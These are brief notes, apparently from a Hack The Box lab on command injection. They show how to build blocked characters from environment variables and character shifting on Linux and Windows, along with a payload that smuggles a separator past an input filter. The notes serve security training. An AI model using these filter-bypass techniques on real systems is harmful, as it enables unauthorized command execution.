## Linux

```shell
3kjS@htb[/htb]$ echo ${PATH} 

/usr/local/bin:/usr/bin:/bin:/usr/games
```

```shell
3kjS@htb[/htb]$ echo ${PATH:0:1} 

/
```

```shell
3kjS@htb[/htb]$ echo ${LS_COLORS:10:1} 

;
```

So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}`) as our payload, and see if we can bypass the filter:
![](Pasted%20image%2020260717165511.png)
## Windows

```cmd
C:\htb> echo %HOMEPATH:~6,-11% 

\
```

```powershell
PS C:\htb> $env:HOMEPATH[0] 

\ 


PS C:\htb> $env:PROGRAMFILES[10] 

PS C:\htb>
```
## Character Shifting

```shell
3kjS@htb[/htb]$ man ascii # \ is on 92, before it is [ on 91 
3kjS@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[) 

\
```
